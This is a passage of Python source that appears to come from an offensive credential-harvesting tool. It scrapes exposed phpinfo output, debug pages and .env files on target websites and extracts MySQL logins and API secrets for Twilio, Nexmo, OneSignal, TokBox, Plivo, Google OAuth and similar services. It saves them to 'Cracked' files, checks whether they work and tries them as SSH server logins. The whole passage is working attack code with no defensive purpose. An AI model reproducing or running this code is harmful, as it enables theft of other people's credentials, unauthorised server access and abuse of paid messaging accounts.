			db_host = get_param(resp, 'MYSQL_HOST </td><td class="v">(.*?) </td></tr>\n')
			db_port = get_param(resp, 'MYSQL_PORT </td><td class="v">(.*?) </td></tr>\n')
			db_name = get_param(resp, 'MYSQL_CONNECTION </td><td class="v">(.*?) </td></tr>\n')
			db_user = get_param(resp, 'MYSQL_USER </td><td class="v">(.*?) </td></tr>\n')
			db_pass = get_param(resp, 'MYSQL_PASSWORD </td><td class="v">(.*?) </td></tr>\n')
			
			if db_host == 'localhost' or db_host == '' or db_host == 'null' or db_host == '127.0.0.1':
				db_host = socket.gethostbyname((clean_domain(url)))

			check_format = f"{db_host}|{db_port}|{db_name}|{db_user}|{db_pass}"

			Normal_Format = f"+++++++++++++++\nURL={url}\nHOST={db_host}\nPORT={db_port}\nNAME={db_name}\nUSERNAME={db_user}\nPASSWORD={db_pass}\n+++++++++++++++"
			x = is_valid_info(check_format)
			if x:
				console.print(f'[+] Found DataBase => {check_format}', style='green')

				if Check_VPS != 'on':
					xSave("Cracked", "VPS-[UNCHECKED]", f"{db_host}|22|{db_user}|{db_pass}")
				else:
					check_vps_details(f"{db_host}|{db_user}|{db_pass}")
				
				find_db_manager(url, db_host, db_port, db_user, db_pass, db_name)

				if db_name == 'root':
					xSave("Cracked", "DataBase-[root-Cracked]", Normal_Format)
				else:
					xSave("Cracked", "DataBase-[Check]", check_format)
					xSave("Cracked", "DataBase-[Cracked]", Normal_Format)
			else:
				console.print(f'[-] Invalid DataBase Details => {check_format}', style='red')
				xSave("Cracked", "DataBase-[Check]", check_format)

	elif "MYSQL_USERNAME" in resp:
		if 'MYSQL_USERNAME </td><td class="v">' in resp:
			db_host = get_param(resp, 'MYSQL_HOST </td><td class="v">(.*?) </td></tr>\n')
			db_port = get_param(resp, 'MYSQL_PORT </td><td class="v">(.*?) </td></tr>\n')
			db_name = get_param(resp, 'MYSQL_CONNECTION </td><td class="v">(.*?) </td></tr>\n')
			db_user = get_param(resp, 'MYSQL_USERNAME </td><td class="v">(.*?) </td></tr>\n')
			db_pass = get_param(resp, 'MYSQL_PASSWORD </td><td class="v">(.*?) </td></tr>\n')
			
			if db_host == 'localhost' or db_host == '' or db_host == 'null' or db_host == '127.0.0.1':
				db_host = socket.gethostbyname((clean_domain(url)))

			check_format = f"{db_host}|{db_port}|{db_name}|{db_user}|{db_pass}"

			Normal_Format = f"+++++++++++++++\nURL={url}\nHOST={db_host}\nPORT={db_port}\nNAME={db_name}\nUSERNAME={db_user}\nPASSWORD={db_pass}\n+++++++++++++++"
			x = is_valid_info(check_format)
			if x:
				console.print(f'[+] Found DataBase => {check_format}', style='green')

				if Check_VPS != 'on':
					xSave("Cracked", "VPS-[UNCHECKED]", f"{db_host}|22|{db_user}|{db_pass}")
				else:
					check_vps_details(f"{db_host}|{db_user}|{db_pass}")
				
				find_db_manager(url, db_host, db_port, db_user, db_pass, db_name)

				if db_name == 'root':
					xSave("Cracked", "DataBase-[root-Cracked]", Normal_Format)
				else:
					xSave("Cracked", "DataBase-[Check]", check_format)
					xSave("Cracked", "DataBase-[Cracked]", Normal_Format)
			else:
				console.print(f'[-] Invalid DataBase Details => {check_format}', style='red')
				xSave("Cracked", "DataBase-[Check]", check_format)

		elif 'MYSQL_USERNAME_WEB </td><td class="v">' in resp:
			db_host = get_param(resp, 'MYSQL_HOST </td><td class="v">(.*?) </td></tr>\n')
			db_port = get_param(resp, 'MYSQL_PORT </td><td class="v">(.*?) </td></tr>\n')
			db_name = get_param(resp, 'MYSQL_CONNECTION </td><td class="v">(.*?) </td></tr>\n')
			db_user = get_param(resp, 'MYSQL_USERNAME_WEB </td><td class="v">(.*?) </td></tr>\n')
			db_pass = get_param(resp, 'MYSQL_PASSWORD_WEB </td><td class="v">(.*?) </td></tr>\n')
			
			if db_host == 'localhost' or db_host == '' or db_host == 'null' or db_host == '127.0.0.1':
				db_host = socket.gethostbyname((clean_domain(url)))

			check_format = f"{db_host}|{db_port}|{db_name}|{db_user}|{db_pass}"

			Normal_Format = f"+++++++++++++++\nURL={url}\nHOST={db_host}\nPORT={db_port}\nNAME={db_name}\nUSERNAME={db_user}\nPASSWORD={db_pass}\n+++++++++++++++"
			x = is_valid_info(check_format)
			if x:
				console.print(f'[+] Found DataBase => {check_format}', style='green')

				if Check_VPS != 'on':
					xSave("Cracked", "VPS-[UNCHECKED]", f"{db_host}|22|{db_user}|{db_pass}")
				else:
					check_vps_details(f"{db_host}|{db_user}|{db_pass}")
				
				find_db_manager(url, db_host, db_port, db_user, db_pass, db_name)

				if db_name == 'root':
					xSave("Cracked", "DataBase-[root-Cracked]", Normal_Format)
				else:
					xSave("Cracked", "DataBase-[Check]", check_format)
					xSave("Cracked", "DataBase-[Cracked]", Normal_Format)
			else:
				console.print(f'[-] Invalid DataBase Details => {check_format}', style='red')
				xSave("Cracked", "DataBase-[Check]", check_format)

	elif 'DB_MYSQL_HOST' in resp:
		if "DB_MYSQL_HOST=" in resp:
			db_host = get_param(resp, '\nDB_MYSQL_HOST=(.*?)\n')
			db_port = get_param(resp, '\nDB_MYSQL_PORT=(.*?)\n')
			db_name = get_param(resp, '\nDB_MYSQL_DATABASE=(.*?)\n')
			db_user = get_param(resp, '\nDB_MYSQL_USERNAME=(.*?)\n')
			db_pass = get_param(resp, '\nDB_MYSQL_PASSWORD=(.*?)\n')

			if db_host == 'localhost' or db_host == '' or db_host == 'null' or db_host == '127.0.0.1':
				db_host = socket.gethostbyname((clean_domain(url)))

			check_format = f"{db_host}|{db_port}|{db_name}|{db_user}|{db_pass}"
			Normal_Format = f"+++++++++++++++\nURL={url}\nHOST={db_host}\nPORT={db_port}\nNAME={db_name}\nUSERNAME={db_user}\nPASSWORD={db_pass}\n+++++++++++++++"
			
			x = is_valid_info(check_format)
			if x:
				console.print(f'[+] Found DataBase => {check_format}', style='green')

				if Check_VPS != 'on':
					xSave("Cracked", "VPS-[UNCHECKED]", f"{db_host}|22|{db_user}|{db_pass}")
				else:
					check_vps_details(f"{db_host}|{db_user}|{db_pass}")
				
				find_db_manager(url, db_host, db_port, db_user, db_pass, db_name)

				if db_name == 'root':
					xSave("Cracked", "DataBase-[root-Cracked]", Normal_Format)
				else:
					xSave("Cracked", "DataBase-[Check]", check_format)
					xSave("Cracked", "DataBase-[Cracked]", Normal_Format)
			else:
				console.print(f'[-] Invalid DataBase Details => {check_format}', style='red')
				xSave("Cracked", "DataBase-[Check]", check_format)

		elif "<td>DB_MYSQL_HOST</td>" in resp:
			db_host = get_param(resp, '<td>DB_MYSQL_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			db_port = get_param(resp, '<td>DB_MYSQL_PORT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			db_name = get_param(resp, '<td>DB_MYSQL_DATABASE<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			db_user = get_param(resp, '<td>DB_MYSQL_USERNAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			db_pass = get_param(resp, '<td>DB_MYSQL_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			
			if db_host == 'localhost' or db_host == '' or db_host == 'null' or db_host == '127.0.0.1':
				db_host = socket.gethostbyname((clean_domain(url)))

			check_format = f"{db_host}|{db_port}|{db_name}|{db_user}|{db_pass}"

			Normal_Format = f"+++++++++++++++\nURL={url}\nHOST={db_host}\nPORT={db_port}\nNAME={db_name}\nUSERNAME={db_user}\nPASSWORD={db_pass}\n+++++++++++++++"
			x = is_valid_info(check_format)
			if x:
				console.print(f'[+] Found DataBase => {check_format}', style='green')

				if Check_VPS != 'on':
					xSave("Cracked", "VPS-[UNCHECKED]", f"{db_host}|22|{db_user}|{db_pass}")
				else:
					check_vps_details(f"{db_host}|{db_user}|{db_pass}")
				
				find_db_manager(url, db_host, db_port, db_user, db_pass, db_name)

				if db_name == 'root':
					xSave("Cracked", "DataBase-[root-Cracked]", Normal_Format)
				else:
					xSave("Cracked", "DataBase-[Check]", check_format)
					xSave("Cracked", "DataBase-[Cracked]", Normal_Format)
			else:
				console.print(f'[-] Invalid DataBase Details => {check_format}', style='red')
				xSave("Cracked", "DataBase-[Check]", check_format)

	else:
		return None

def get_twillio(resp, url):
	if "twilio.tw_prod_token" in resp:
		if "twilio.tw_prod_token = " in resp:
			acc_sid = get_param(resp, '\ntwilio.tw_prod_SID = (.*?)\n')
			auth_token = get_param(resp, '\ntwilio.tw_prod_token = (.*?)\n')
			check_format = f"{acc_sid}|{auth_token}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found Twilio ==> {url} | DATA : {check_format}", style="green")
				Check_twilio(acc_sid, auth_token, url)

	elif "TWILIO_ACCOUNT_SID" in resp:
		if "<td>TWILIO_ACCOUNT_SID</td>" in resp:
			acc_sid = get_param(resp, '<td>TWILIO_ACCOUNT_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			auth_token = get_param(resp, '<td>TWILIO_AUTH_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			check_format = f"{acc_sid}|{auth_token}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found Twilio ==> {url} | DATA : {check_format}", style="green")
				Check_twilio(acc_sid, auth_token, url)

		elif "<td>#TWILIO_ACCOUNT_SID</td>" in resp:
			acc_sid = get_param(resp, '<td>#TWILIO_ACCOUNT_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			auth_token = get_param(resp, '<td>#TWILIO_ACCOUNT_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			check_format = f"{acc_sid}|{auth_token}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found Twilio ==> {url} | DATA : {check_format}", style="green")
				Check_twilio(acc_sid, auth_token, url)

		elif '#TWILIO_ACCOUNT_SID=' in resp:
			acc_sid = get_param(resp, '\n#TWILIO_ACCOUNT_SID=(.*?)\n')
			auth_token = get_param(resp, '\n#TWILIO_ACCOUNT_TOKEN=(.*?)\n')
			check_format = f"{acc_sid}|{auth_token}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found Twilio ==> {url} | DATA : {check_format}", style="green")
				Check_twilio(acc_sid, auth_token, url)

		elif "TWILIO_ACCOUNT_SID=" in resp:
			acc_sid = get_param(resp, '<td>TWILIO_ACCOUNT_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			auth_token = get_param(resp, '<td>TWILIO_ACCOUNT_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			check_format = f"{acc_sid}|{auth_token}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found Twilio ==> {url} | DATA : {check_format}", style="green")
				Check_twilio(acc_sid, auth_token, url)

	elif 'TWILIO_SID' in resp:
		if "<td>TWILIO_SID</td>" in resp:
			acc_sid = get_param(resp, '<td>TWILIO_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			auth_token = get_param(resp, '<td>TWILIO_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			check_format = f"{acc_sid}|{auth_token}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found Twilio ==> {url} | DATA : {check_format}", style="green")
				Check_twilio(acc_sid, auth_token, url)

		elif "<td>#TWILIO_SID</td>" in resp:
			acc_sid = get_param(resp, '<td>#TWILIO_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			auth_token = get_param(resp, '<td>#TWILIO_AUTH<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			check_format = f"{acc_sid}|{auth_token}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found Twilio ==> {url} | DATA : {check_format}", style="green")
				Check_twilio(acc_sid, auth_token, url)

		elif "TWILIO_SID=" in resp:
			acc_sid = get_param(resp, '\nTWILIO_SID=(.*?)\n')
			auth_token = get_param(resp, '\nTWILIO_TOKEN=(.*?)\n')
			check_format = f"{acc_sid}|{auth_token}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found Twilio ==> {url} | DATA : {check_format}", style="green")
				Check_twilio(acc_sid, auth_token, url)

		elif "<td>TWILIO_API_SID</td>" in resp:
			acc_sid = get_param(resp, '<td>TWILIO_API_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			auth_token = get_param(resp, '<td>TWILIO_API_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>')
			check_format = f"{acc_sid}|{auth_token}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found Twilio ==> {url} | DATA : {check_format}", style="green")
				Check_twilio(acc_sid, auth_token, url)

	elif "ACCOUNT_SID" in resp:
		if "ACCOUNT_SID=" in resp:
			acc_sid = get_param(resp, '\nACCOUNT_SID=(.*?)\n')
			auth_token = get_param(resp, '\nAUTH_TOKEN=(.*?)\n')
			check_format = f"{acc_sid}|{auth_token}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found Twilio ==> {url} | DATA : {check_format}", style="green")
				Check_twilio(acc_sid, auth_token, url)

		elif "#ACCOUNT_SID=" in resp:
			acc_sid = get_param(resp, '\n#ACCOUNT_SID=(.*?)\n')
			auth_token = get_param(resp, '\n#AUTH_TOKEN=(.*?)\n')
			check_format = f"{acc_sid}|{auth_token}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found Twilio ==> {url} | DATA : {check_format}", style="green")
				Check_twilio(acc_sid, auth_token, url)

	elif "TWILIO_WRITE_SID" in resp:
		if "TWILIO_WRITE_SID=" in resp:
			sid = get_param(resp, "\nTWILIO_WRITE_SID=(.*?)\n")
			secret = get_param(resp, "\nTWILIO_WRITE_AUTH_TOKEN=(.*?)\n")
			phone = get_param(resp, "\nTWILIO_NUMBER=(.*?)\n")
			check_format = f"{sid}|{secret}|{phone}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Twilio Found ==> {url} | DATA : {check_format}", style="green")

		elif "<td>TWILIO_WRITE_SID</td>" in resp:
			sid = get_param(resp, "<td>TWILIO_WRITE_SID<\/td>\s+<td><pre.*>(.*?)<\/span>")
			secret = get_param(resp, "<td>TWILIO_WRITE_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>")
			phone = get_param(resp, "<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>")
			check_format = f"{sid}|{secret}|{phone}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Twilio Found ==> {url} | DATA : {check_format}", style="green")

	elif "TWILIO_SECURE_ID" in resp:
		if "TWILIO_SECURE_ID=" in resp:
			sid = get_param(resp, "\nTWILIO_SECURE_ID=(.*?)\n")
			secret = get_param(resp, "\nTWILIO_TOKEN=(.*?)\n")
			phone = get_param(resp, "\nTWILIO_NUMBER=(.*?)\n")
			check_format = f"{sid}|{secret}|{phone}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Twilio Found ==> {url} | DATA : {check_format}", style="green")

		elif "<td>TWILIO_SECURE_ID</td>" in resp:
			sid = get_param(resp, "<td>TWILIO_SECURE_ID<\/td>\s+<td><pre.*>(.*?)<\/span>")
			secret = get_param(resp, "<td>TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>")
			phone = get_param(resp, "<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>")
			check_format = f"{sid}|{secret}|{phone}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Twilio Found ==> {url} | DATA : {check_format}", style="green")

	elif "TWILIO_READ_SID" in resp:
		if "TWILIO_READ_SID=" in resp:
			sid = get_param(resp, "\nTWILIO_READ_SID=(.*?)\n")
			secret = get_param(resp, "\nTWILIO_READ_AUTH_TOKEN=(.*?)\n")
			phone = get_param(resp, "\nTWILIO_NUMBER=(.*?)\n")
			check_format = f"{sid}|{secret}|{phone}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Twilio Found ==> {url} | DATA : {check_format}", style="green")

		elif "<td>TWILIO_READ_SID</td>" in resp:
			sid = get_param(resp, "<td>TWILIO_READ_SID<\/td>\s+<td><pre.*>(.*?)<\/span>")
			secret = get_param(resp, "<td>TWILIO_READ_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>")
			phone = get_param(resp, "<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>")
			check_format = f"{sid}|{secret}|{phone}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Twilio Found ==> {url} | DATA : {check_format}", style="green")

	elif "TEL_SID" in resp:
		if "TEL_SID=" in resp:
			sid = get_param(resp, "\nTEL_SID=(.*?)\n")
			secret = get_param(resp, "\nTEL_TOK=(.*?)\n")
			phone = get_param(resp, "\nTWILIO_NUMBER=(.*?)\n")
			check_format = f"{sid}|{secret}|{phone}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Twilio Found ==> {url} | DATA : {check_format}", style="green")

		elif "<td>TEL_SID</td>" in resp:
			sid = get_param(resp, "<td>TEL_SID<\/td>\s+<td><pre.*>(.*?)<\/span>")
			secret = get_param(resp, "<td>TEL_TOK<\/td>\s+<td><pre.*>(.*?)<\/span>")
			phone = get_param(resp, "<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>")
			check_format = f"{sid}|{secret}|{phone}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Twilio Found ==> {url} | DATA : {check_format}", style="green")

	elif "twillio_message_id" in resp:
		if "twillio_message_id=" in resp:
			sid = get_param(resp, "\ntwillio_message_id=(.*?)\n")
			secret = get_param(resp, "\ntwillio_message_token=(.*?)\n")
			phone = get_param(resp, "\nTWILIO_NUMBER=(.*?)\n")
			check_format = f"{sid}|{secret}|{phone}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Twilio Found ==> {url} | DATA : {check_format}", style="green")

		elif "<td>twillio_message_id</td>" in resp:
			sid = get_param(resp, "<td>twillio_message_id<\/td>\s+<td><pre.*>(.*?)<\/span>")
			secret = get_param(resp, "<td>twillio_message_token<\/td>\s+<td><pre.*>(.*?)<\/span>")
			phone = get_param(resp, "<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>")
			check_format = f"{sid}|{secret}|{phone}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Twilio Found ==> {url} | DATA : {check_format}", style="green")

	if "=AC" in resp:
		xSave("Cracked", "Twilio-[MANUAL]", url)

def get_nexmo(resp, url):
	if "NEXMO_KEY" in resp:
		if "NEXMO_KEY=" in resp:
			apikey = get_param(resp, "NEXMO_KEY=(.*?)\n")
			secret = get_param(resp, "NEXMO_SECRET=(.*?)\n")
			check_format = f"{apikey}|{secret}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found Nexmo ==> {url} | DATA : {check_format}", style="green")
				Check_Vonage(apikey, secret, url)

		elif "<td>NEXMO_KEY</td>" in resp:
			apikey = get_param(resp, "<td>NEXMO_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			secret = get_param(resp, "<td>NEXMO_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			check_format = f"{apikey}|{secret}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found Nexmo ==> {url} | DATA : {check_format}", style="green")
				Check_Vonage(apikey, secret, url)

	elif "NEXMO_API_KEY" in resp:
		if "NEXMO_API_KEY=" in resp:
			apikey = get_param(resp, "NEXMO_API_KEY=(.*?)\n")
			secret = get_param(resp, "NEXMO_API_SECRET=(.*?)\n")
			check_format = f"{apikey}|{secret}"
			console.print(f'[+] Found Nexmo => {url} - {check_format}', style='green')
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found Nexmo ==> {url} | DATA : {check_format}", style="green")
				Check_Vonage(apikey, secret, url)

		elif "<td>NEXMO_API_KEY</td>" in resp:
			apikey = get_param(resp, "<td>NEXMO_API_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			secret = get_param(resp, "<td>NEXMO_API_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			check_format = f"{apikey}|{secret}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found Nexmo ==> {url} | DATA : {check_format}", style="green")
				Check_Vonage(apikey, secret, url)

	elif "EXOTEL_API_KEY" in resp:
		if "EXOTEL_API_KEY=" in resp:
			apikey = get_param(resp, "\nEXOTEL_API_KEY=(.*?)\n")
			secret = get_param(resp, "\nEXOTEL_API_TOKEN=(.*?)\n")
			sid = get_param(resp, "\nEXOTEL_API_SID=(.*?)\n")
			check_format = f"{apikey}|{secret}|{sid}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found EXOTEL ==> {url} | DATA : {check_format}", style="green")
				xSave("Cracked", "EXOTEL-API", check_format)

		elif "<td>EXOTEL_API_KEY</td>" in resp:
			apikey = get_param(resp, "<td>EXOTEL_API_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			secret = get_param(resp, "<td>EXOTEL_API_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			check_format = f"{apikey}|{secret}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found EXOTEL ==> {url} | DATA : {check_format}", style="green")
				xSave("Cracked", "EXOTEL-API", check_format)

	elif "ONESIGNAL_APP_ID" in resp:
		if "ONESIGNAL_APP_ID=" in resp:
			apikey = get_param(resp, "\nONESIGNAL_APP_ID=(.*?)\n")
			secret = get_param(resp, "\nONESIGNAL_REST_API_KEY=(.*?)\n")
			sid = get_param(resp, "\nONESIGNAL_USER_AUTH_KEY=(.*?)\n")
			check_format = f"{apikey}|{secret}|{sid}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found OneSignal ==> {url} | DATA : {check_format}", style="green")
				xSave("Cracked", "ONESIGNAL-API", check_format)

		elif "<td>ONESIGNAL_APP_ID" in resp:
			apikey = get_param(resp, "<td>ONESIGNAL_APP_ID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			secret = get_param(resp, "<td>ONESIGNAL_REST_API_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			sid = get_param(resp, "<td>ONESIGNAL_USER_AUTH_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			check_format = f"{apikey}|{secret}|{sid}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found OneSignal ==> {url} | DATA : {check_format}", style="green")
				xSave("Cracked", "ONESIGNAL-API", check_format)

	elif "TOKBOX_KEY_DEV" in resp:
		if "TOKBOX_KEY_DEV=" in resp:
			apikey = get_param(resp, "\nTOKBOX_KEY_DEV=(.*?)\n")
			secret = get_param(resp, "\nTOKBOX_SECRET_DEV=(.*?)\n")
			check_format = f"{apikey}|{secret}|{url}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found TOKBOX ==> {url} | DATA : {apikey}|{secret}", style="green")
				xSave("Cracked", "TOKBOX-API", check_format)

		elif "<td>TOKBOX_KEY_DEV" in resp:
			apikey = get_param(resp, "<td>TOKBOX_KEY_DEV<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			secret = get_param(resp, "<td>TOKBOX_SECRET_DEV<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			check_format = f"{apikey}|{secret}|{url}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found TOKBOX ==> {url} | DATA : {apikey}|{secret}", style="green")
				xSave("Cracked", "TOKBOX-API", check_format)

	elif "TOKBOX_KEY" in resp:
		if "TOKBOX_KEY=" in resp:
			apikey = get_param(resp, "\nTOKBOX_KEY=(.*?)\n")
			secret = get_param(resp, "\nTOKBOX_SECRET=(.*?)\n")
			check_format = f"{apikey}|{secret}|{url}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found TOKBOX ==> {url} | DATA : {apikey}|{secret}", style="green")
				xSave("Cracked", "TOKBOX-API", check_format)

		elif "<td>TOKBOX_KEY" in resp:
			apikey = get_param(resp, "<td>TOKBOX_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			secret = get_param(resp, "<td>TOKBOX_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			check_format = f"{apikey}|{secret}|{url}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found TOKBOX ==> {url} | DATA : {apikey}|{secret}", style="green")
				xSave("Cracked", "TOKBOX-API", check_format)

	elif "TOKBOX_KEY_OLD" in resp:
		if "TOKBOX_KEY_OLD=" in resp:
			apikey = get_param(resp, "\nTOKBOX_KEY_OLD=(.*?)\n")
			secret = get_param(resp, "\nTOKBOX_SECRET_OLD=(.*?)\n")
			check_format = f"{apikey}|{secret}|{url}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found TOKBOX ==> {url} | DATA : {apikey}|{secret}", style="green")
				xSave("Cracked", "TOKBOX-API", check_format)

		elif "<td>TOKBOX_KEY_OLD" in resp:
			apikey = get_param(resp, "<td>TOKBOX_KEY_OLD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			secret = get_param(resp, "<td>TOKBOX_SECRET_OLD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			check_format = f"{apikey}|{secret}|{url}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Found TOKBOX ==> {url} | DATA : {apikey}|{secret}", style="green")
				xSave("Cracked", "TOKBOX-API", check_format)

	elif "PLIVO_AUTH_ID" in resp:
		if "PLIVO_AUTH_ID=" in resp:
			apikey = get_param(resp, "\nPLIVO_AUTH_ID=(.*?)\n")
			secret = get_param(resp, '\nPLIVO_AUTH_TOKEN=(.*?)\n')
			
			if apikey != '-' and secret != '-':
				check_format = f"{apikey}|{secret}"
				console.print(f'[+] Found Plivo => {check_format}', style='green')
				xSave("Cracked", "PLIVO-API", check_format)

		elif "<td>PLIVO_AUTH_ID</td>" in resp:
			apikey = get_param(resp, "<td>PLIVO_AUTH_ID<\/td>\s+<td><pre.*>(.*?)<\/span>")
			secret = get_param(resp, "<td>PLIVO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>")
			if apikey != '-' and secret != '-':
				check_format = f"{apikey}|{secret}"
				console.print(f'[+] Found Plivo => {check_format}', style='green')
				xSave("Cracked", "PLIVO-API", check_format)

	elif "SMSTO_CLIENT_ID" in resp:
		if "SMSTO_CLIENT_ID=" in resp:
			apikey = get_param(resp, "\nSMSTO_CLIENT_ID=(.*?)\n")
			secret = get_param(resp, '\nSMSTO_CLIENT_SECRET=(.*?)\n')
			if apikey != '-' and secret != '-':
				check_format = f"{apikey}|{secret}"
				console.print(f'[+] Found SMSTO => {check_format}', style='green')
				xSave("Cracked", "SMSTO-API", check_format)

		elif "<td>SMSTO_CLIENT_ID</td>" in resp:
			apikey = get_param(resp, "<td>SMSTO_CLIENT_ID<\/td>\s+<td><pre.*>(.*?)<\/span>")
			secret = get_param(resp, "<td>SMSTO_CLIENT_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>")
			if apikey != '-' and secret != '-':
				check_format = f"{apikey}|{secret}"
				console.print(f'[+] Found SMSTO => {check_format}', style='green')
				xSave("Cracked", "SMSTO-API", check_format)

	elif "G+_CLIENT_ID=" in resp or "G+_CLIENT_ID = " in resp or "<td>G+_CLIENT_ID" in resp or "GOOGLE_CLIENT_ID=" in resp or "GOOGLE_CLIENT_ID = " in resp or "<td>GOOGLE_CLIENT_ID" in resp:
		if "G+_CLIENT_ID=" in resp:
			google_id = get_param(resp, "G+_CLIENT_ID=(.*?)\n")
			google_secret = get_param(resp, "G+_CLIENT_SECRET=(.*?)\n")
			google_redi = get_param(resp, "G+_REDIRECT=(.*?)\n")
			check_format = f"{google_id}|{google_secret}|{google_redi}"
			console.print(f'[+] Found GOOGLE CILENT ID => {check_format}', style='green')
			xSave("Cracked", "G+_CLIENT", check_format)

		elif "GOOGLE_CLIENT_ID=" in resp:
			google_id = get_param(resp, "GOOGLE_CLIENT_ID=(.*?)\n")
			google_secret = get_param(resp, "GOOGLE_CLIENT_SECRET=(.*?)\n")
			google_redi = get_param(resp, "GOOGLE_REDIRECT=(.*?)\n")
			check_format = f"{google_id}|{google_secret}|{google_redi}"
			console.print(f'[+] Found GOOGLE CILENT ID => {check_format}', style='green')
			xSave("Cracked", "G+_CLIENT", check_format)

		elif "G+_CLIENT_ID = " in resp:
			google_id = get_param(resp, "G+_CLIENT_ID = (.*?)\n")
			google_secret = get_param(resp, "G+_CLIENT_SECRET = (.*?)\n")
			google_redi = get_param(resp, "G+_REDIRECT = (.*?)\n")
			check_format = f"{google_id}|{google_secret}|{google_redi}"
			console.print(f'[+] Found GOOGLE CILENT ID => {check_format}', style='green')
			xSave("Cracked", "G+_CLIENT", check_format)

		elif "GOOGLE_CLIENT_ID = " in resp:
			google_id = get_param(resp, "GOOGLE_CLIENT_ID = (.*?)\n")
			google_secret = get_param(resp, "GOOGLE_CLIENT_SECRET = (.*?)\n")
			google_redi = get_param(resp, "GOOGLE_REDIRECT = (.*?)\n")
			check_format = f"{google_id}|{google_secret}|{google_redi}"
			console.print(f'[+] Found GOOGLE CILENT ID => {check_format}', style='green')
			xSave("Cracked", "G+_CLIENT", check_format)

		elif "<td>G+_CLIENT_ID<\\/td>" in resp:
			google_id = get_param(resp, "<td>G+_CLIENT_ID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			google_secret = get_param(resp, "<td>G+_CLIENT_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			google_redi = get_param(resp, "<td>G+_REDIRECT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			check_format = f"{google_id}|{google_secret}|{google_redi}"
